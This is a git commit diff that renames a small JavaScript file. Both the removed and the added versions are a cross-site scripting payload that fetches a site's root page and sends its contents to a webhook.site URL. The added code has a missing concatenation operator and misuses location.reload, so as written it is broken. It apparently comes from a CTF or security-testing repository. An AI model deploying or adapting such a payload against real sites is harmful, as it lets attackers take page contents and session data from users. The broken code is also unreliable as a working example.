f704c76701eeead251ee7b96ffe9213c09636aff
M0NT3C4RL0 <109765724+M0NT3C4RL0@users.noreply.github.com>
2022-09-03 16:32:33 +0200

    Update and rename in.js to ins.js

--- in.js
+++
@@ -1,2 +0,0 @@
-const results = fetch(new URL("/"));
-document.location.reload("https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c=" + results);
---
+++ ins.js
@@ -0,0 +1,5 @@
+fetch('/')
+    .then(function(response) {
+        // When the page is loaded convert it to text
+        document.location.reload("https://webhook.site/bb581fce-351d-4b88-96fd-ab230a1465fd?c="  response.text());
+    });
